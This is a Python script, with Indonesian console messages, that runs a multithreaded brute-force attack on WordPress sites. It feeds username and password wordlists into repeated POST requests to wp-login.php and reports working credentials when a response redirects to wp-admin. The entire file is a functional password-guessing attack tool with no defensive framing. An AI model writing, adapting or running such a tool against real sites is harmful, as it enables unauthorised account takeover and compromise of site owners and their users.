import requests
from threading import Thread
from queue import Queue

def load_wordlist(path):
    try:
        with open(path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] File tidak ditemukan: {path}")
        return []

def attempt_login(target, username, password):
    login_url = f"{target}/wp-login.php"
    session = requests.Session()

    payload = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': f"{target}/wp-admin/",
        'testcookie': '1'
    }

    try:
        res = session.post(login_url, data=payload, timeout=10, allow_redirects=False)
        if "location" in res.headers and "/wp-admin" in res.headers["location"]:
            print(f"[+] Berhasil login: {username}:{password}")
            return True
        else:
            print(f"[-] Gagal: {username}:{password}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error saat mencoba login: {e}")
    return False

def brute_force_login(target, user=None, userlist_path="userlist.txt", passlist_path="passlist.txt", threads=5):
    print(f"[*] Memulai brute force ke: {target}")
    usernames = [user] if user else load_wordlist(userlist_path)
    passwords = load_wordlist(passlist_path)

    combo_queue = Queue()

    for username in usernames:
        for password in passwords:
            combo_queue.put((username, password))

    def worker():
        while not combo_queue.empty():
            u, p = combo_queue.get()
            if attempt_login(target, u, p):
                with combo_queue.mutex:
                    combo_queue.queue.clear()
                break
            combo_queue.task_done()

    thread_list = []
    for _ in range(threads):
        t = Thread(target=worker)
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    print("[*] Brute force selesai.")
